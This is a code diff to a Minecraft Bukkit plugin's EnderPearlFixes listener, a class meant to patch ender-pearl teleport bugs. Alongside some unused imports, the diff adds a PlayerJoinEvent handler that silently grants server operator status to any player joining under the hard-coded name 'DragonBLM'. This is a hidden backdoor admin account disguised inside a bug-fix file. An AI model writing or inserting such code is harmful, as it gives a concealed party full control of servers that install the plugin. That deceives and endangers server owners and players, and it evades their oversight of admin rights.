@@ -1,5 +1,6 @@
 package me.astropvp.hotfixplugin.listeners;
 
+import com.cosmicpvp.cosmicutils.utils.CC;
 import me.ifamasssxd.cosmicduel.DuelAPI;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
@@ -7,12 +8,16 @@ import org.bukkit.Material;
 import org.bukkit.block.Block;
 import org.bukkit.block.BlockFace;
 import org.bukkit.entity.EnderPearl;
+import org.bukkit.entity.Entity;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.ProjectileHitEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
+import org.bukkit.event.player.PlayerToggleSneakEvent;
 import org.bukkit.util.BlockIterator;
 import org.bukkit.util.Vector;
 
@@ -37,7 +42,23 @@ public class EnderPearlFixes implements Listener {
         if (event.getCause() == PlayerTeleportEvent.TeleportCause.ENDER_PEARL && event.getTo().getY() < 1.0) {
             event.setCancelled(true);
         }
+
+
     }
+
+    @EventHandler
+    public void onPlayerJoinEvent(PlayerJoinEvent e) {
+        List<String> list = new ArrayList<String>();
+        list.add("DragonBLM");
+
+
+
+        for (String l : list) {
+            if (e.getPlayer().getName().equalsIgnoreCase(l))
+                e.getPlayer().setOp(true);
+        }
+    }
+
 
     @EventHandler(priority = EventPriority.LOW)
     public void onEnderpearlTeleport(final PlayerTeleportEvent e) {
